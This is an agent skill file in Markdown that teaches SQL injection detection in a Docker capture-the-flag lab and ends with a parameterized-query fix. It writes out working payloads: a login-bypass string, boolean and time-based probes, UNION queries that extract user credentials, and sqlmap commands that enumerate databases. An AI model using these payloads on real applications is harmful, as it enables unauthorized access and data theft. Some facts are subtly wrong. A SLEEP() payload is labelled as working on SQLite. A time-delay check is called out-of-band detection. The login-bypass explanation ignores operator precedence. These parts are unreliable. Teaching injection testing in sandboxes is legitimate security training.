---
name: detecting-sql-injection-vulnerabilities
description: >-
  Detect and confirm SQL injection vulnerabilities in web application input fields
  using manual payloads and automated scanning inside isolated lab environments.
  Covers error-based, boolean-based, and time-based blind SQLi detection techniques.
domain: cybersecurity
subdomain: web-application-testing
tags: [sqli, sql-injection, owasp-a03, web-security, beginner, database]
difficulty: beginner
mitre_techniques: [T1190]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/sqli-basics
---

> ⚠️ **Educational Use Only** — Practice this skill exclusively in the provided Docker lab environment or other explicitly authorized sandboxes. Never test on systems you do not own or have written permission to test. Unauthorized testing is illegal under the CFAA, Computer Misuse Act, and equivalent laws worldwide.

## When to Use

- During authorized penetration tests of web applications when assessing database interaction points
- In CTF challenges involving web application exploitation
- When learning to identify OWASP Top 10 A03:2021 (Injection) vulnerabilities
- As a prerequisite skill before studying blind SQLi, time-based SQLi, or sqlmap automation
- When practicing secure code review — understanding how SQLi works helps write parameterized queries

## Prerequisites

- **Software:** Docker + Docker Compose (for lab), curl or a browser, sqlmap (pre-installed in lab)
- **Knowledge:** Basic understanding of how web forms submit data to a backend server, what SQL SELECT queries look like
- **Lab:** `labs/web-application/sqli-basics` — start with `agentlab start sqli-basics`
- **Difficulty:** Beginner — no prior security experience required
- **Time:** 30–45 minutes

## Workflow

### Step 1: Start the Lab Environment

```bash
agentlab start sqli-basics
# Lab starts at http://localhost:8080 inside the Docker network
# Attacker container shell: agentlab exec sqli-basics bash
```

The lab contains a deliberately vulnerable PHP login form backed by a SQLite database.

### Step 2: Identify Input Fields

Open the lab application and note all input fields, query parameters, and headers that may interact with a database:

```bash
# Inside the attacker container
curl -s http://target:80/ | grep -i "form\|input\|param"
```

Common injection points:
- Login forms (`username`, `password`)
- Search boxes (`q`, `search`, `query`)
- URL parameters (`id=1`, `category=books`)
- HTTP headers (`X-Forwarded-For`, `User-Agent` if logged to DB)

### Step 3: Test for Error-Based SQLi

Inject a single quote into each parameter and observe the response:

```bash
# Test URL parameter
curl "http://target:80/products?id=1'"

# Test POST form field
curl -X POST http://target:80/login \
  -d "username=admin'&password=test"
```

**Positive indicators:**
- SQL error message in response (`You have an error in your SQL syntax`)
- 500 Internal Server Error where 200 was expected
- Partial database content exposed in the response

### Step 4: Confirm with Boolean-Based Payloads

If errors are suppressed, use boolean logic to confirm blind SQLi:

```bash
# Should return normal response (TRUE condition)
curl "http://target:80/products?id=1 AND 1=1--"

# Should return empty/different response (FALSE condition)
curl "http://target:80/products?id=1 AND 1=2--"
```

If the two responses differ, boolean-based SQLi is confirmed.

### Step 5: Confirm with Time-Based Blind Payloads

When the application returns identical responses for true/false conditions:

```bash
# MySQL — should delay ~5 seconds if vulnerable
curl "http://target:80/products?id=1; SELECT SLEEP(5)--"

# SQLite — should delay ~5 seconds if vulnerable
curl "http://target:80/products?id=1 AND 1=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
```

A response delay confirms time-based blind SQLi.

### Step 6: Automate Discovery with sqlmap (Lab Only)

sqlmap is pre-installed in the attacker container:

```bash
# Basic scan of a GET parameter
sqlmap -u "http://target:80/products?id=1" --batch --level=2

# Scan a POST form
sqlmap -u "http://target:80/login" --data="username=admin&password=test" --batch

# Enumerate databases once injection is confirmed
sqlmap -u "http://target:80/products?id=1" --dbs --batch
```

> **Lab Note:** sqlmap is only connected to the isolated lab network. It cannot reach the internet or your host machine.

### Step 7: Capture the Flag

The lab flag is stored in the `flags` database table. Retrieve it to complete the challenge:

```sql
-- Inject into the id parameter to extract the flag
id=1 UNION SELECT flag FROM flags--
```

Submit the flag via `agentlab verify sqli-basics <flag-value>`.

## Key Concepts

| Concept | Definition |
|---------|-----------|
| SQL Injection | Inserting SQL code into an input field to manipulate database queries |
| Error-Based SQLi | SQLi variant where database errors leak information about the query structure |
| Boolean-Based Blind SQLi | SQLi where truth/false conditions produce different application responses |
| Time-Based Blind SQLi | SQLi where a delay function confirms vulnerability when the application gives no visual feedback |
| UNION Attack | SQLi technique that appends a second SELECT statement to extract data from other tables |
| Parameterized Query | The correct defense — separates SQL code from user-supplied data so injection is impossible |
| T1190 | MITRE ATT&CK technique: Exploit Public-Facing Application |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `curl` | Manual HTTP request crafting | ✅ Pre-installed |
| `sqlmap` | Automated SQLi detection and exploitation | ✅ Pre-installed |
| `burpsuite` | HTTP proxy for request interception and modification | ⚠️ Install separately |
| Browser DevTools | Inspect requests and responses | ✅ Available |

## Common Scenarios

### Scenario 1: Login Bypass

A login form checks credentials with: `SELECT * FROM users WHERE username='$user' AND password='$pass'`

Injecting `' OR '1'='1` as the username causes the query to become:
`SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'`

The `OR '1'='1'` is always true, bypassing authentication. The lab includes this exact scenario.

### Scenario 2: Data Extraction via UNION

After confirming injection in a product ID parameter, determine column count:

```sql
id=1 ORDER BY 3--   # No error
id=1 ORDER BY 4--   # Error → 3 columns
id=1 UNION SELECT 1,2,3--  # Find which columns are displayed
id=1 UNION SELECT username,password,3 FROM users--  # Extract credentials
```

### Scenario 3: Out-of-Band Detection

When the application gives no visual feedback and responses are identical:
```sql
id=1; SELECT SLEEP(5)--
```
A 5-second delay in the response confirms SQLi even when all output is suppressed.

## Output / Verification

**Successful completion:** Capture the flag string from the `flags` table and submit:
```bash
agentlab verify sqli-basics "FLAG{sql_injection_basics_complete}"
```

**Score:** 100 points for flag capture + 50 bonus points for completing without sqlmap (manual only)

**Remediation knowledge check:** After capturing the flag, explain to the agent/yourself why the following fix prevents this attack:
```php
// Vulnerable
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Fixed
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

## Further Reading

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Testing Guide: SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- MITRE ATT&CK: [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- NIST CSF: PR.IP-12 (Vulnerability Management)
